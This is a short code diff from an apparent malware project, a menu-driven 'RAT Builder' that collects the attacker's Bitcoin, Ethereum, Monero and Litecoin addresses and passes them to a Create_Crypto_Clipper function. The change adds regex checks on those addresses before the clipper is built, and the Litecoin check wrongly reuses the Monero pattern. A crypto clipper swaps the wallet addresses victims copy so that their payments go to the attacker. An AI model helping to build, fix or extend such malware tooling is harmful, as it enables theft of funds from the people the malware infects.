@@ -109,7 +109,11 @@ def main_menu():
             f'{Fore.CYAN}Enter MONERO address {Fore.YELLOW}>> {Fore.RESET}'))
         ltc = str(input(
             f'{Fore.CYAN}Enter LTC address {Fore.YELLOW}>> {Fore.RESET}'))
-        Create_Crypto_Clipper(btc, eth, mon, ltc)
+        if re.match(pattern=r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", string=btc) != None and re.match(pattern=r"^0x[a-zA-F0-9]{40}$", string=eth) != None and re.match(pattern=r"^4([0-9]|[A-B])(.){93}$", string=mon) != None and re.match(pattern=r"^4([0-9]|[A-B])(.){93}$", string=ltc) != None:
+            Create_Crypto_Clipper(btc, eth, mon, ltc)
+        else:
+            print(f"{Fore.LIGHTRED_EX}One of the crypto adresses providet isn't a valid adress{Fore.RESET}")
+
         main_menu()
 
     elif choice == '420':   # Exit RAT Builder
